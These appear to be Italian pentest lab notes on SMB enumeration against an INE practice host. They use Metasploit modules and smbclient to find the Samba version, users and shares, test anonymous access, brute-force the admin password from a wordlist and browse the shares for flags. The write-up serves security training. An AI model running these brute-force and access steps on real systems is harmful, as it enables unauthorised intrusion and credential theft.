# SMB Enumeration

Usiamo vari auxiliary module per enumerare più informazioni possibili su SMB

<figure><img src="../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

SMB è usato per scambiare file all'interno della stessa rete come tra PC o con la stampante

## SMB version

```
service postgresql start
msfconsole
workspace -a SMB_ENUM
setg RHOSTS <IP dest>
search type:auxiliary name:smb //per filtrare i risultati
use auxiliary/scanner/smb/smb_version
show options //vediamo che c'è RHOSTS è già stato impostato tramite la variabile globale
run // verifichiamo la versione di SMB
```

Possiamo usare una variabile globale per impostare l'IP destinazione senza che ogni volta dobbiamo rimetterlo, usando setg (set global variable).

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

Ogni tanto può capitare che l'OS identificato sia incorretto, infatti ora puoi vedere che dice Windows 6.1 ma poi tra parentesi mostra la versione corretta di SMB e possiamo vedere che si tratta di samba su ubuntu.

### Metodo alternativo usando nmap senza metasploit

Find the exact version of samba server by using appropriate nmap script.

```
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
```

## SMB users enumeration

```
use auxiliary/scanner/smb/smb_enumusers
info // possiamo vedere qualche dettaglio in più sul modulo come nome, licenza, options
run
```

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

Come possiamo vedere dal risultato ha trovato 6 utenti.

## SMB shares enumeration

Per enumerare tutte le cartelle share sul server SMB

```
use auxiliary/scanner/smb/smb_enumshares
show options // tra le opzioni utili al massimo c'è SMBPass e SMBUser nel caso li avessimo e poi ShowFiles per mostrare informazioni dettagliate che potrebbero tornare utili
set ShowFiles true
run
```

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

Troviamo varie share, in particolare share per ogni user presente

Dall'enumerazione degli utenti abbiamo scoperto che c'era un utente admin, se noi riusciamo a fare un bruteforce contro l'utente admin allora possiamo entrare ed accedere a tutte queste share dei vari utenti. Proviamo a farlo.

### Per verificare se è permesso il login anonimo

Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.

```
smbclient -L demo.ine.local -N
```

Anonymous connection is allowed since shares are displayed without requirement of password.

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

## SMB Login brute force module

```
use auxiliary/scanner/smb/smb_login
show options // in questo caso dobbiamo impostare SMBUser e PASS_FILE, poi eventualmente BRUTEFORCE_SPEED, STOP_ON_SUCCESS e il numero di THREADS
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

Ora possiamo provare ad accedere ad SMB con admin e accedere a tutte le varie share e i file in esse contenuti

## Accesso alle share e i file nelle share con utility SMBclient (fuori da metasploit)

```
smbclient -L \\\\192.91.46.3\\ -U admin
```

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

Viene mostrato l'elenco delle share.

### Proviamo ad accedere alle varie share

```
smbclient \\\\<IP>\\public -U admin
```

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

E possiamo poi interagire con l'SMB server:

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

Possiamo poi fare la stessa operazione di accesso alla share ed esaminazione dei file in essa contenuti per tutte le share trovate prima, giusto per dimostrazione proviamo con la share di aisha e anche qui troviamo una flag:

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

## Riassunto passaggi

1. Enumerare la versione SMB
2. Enumerare gli utenti
3. Enumerare le share
4. Brute force attack per trovare le password degli utenti
5. Accesso alle share tramite le password trovate con il brute force

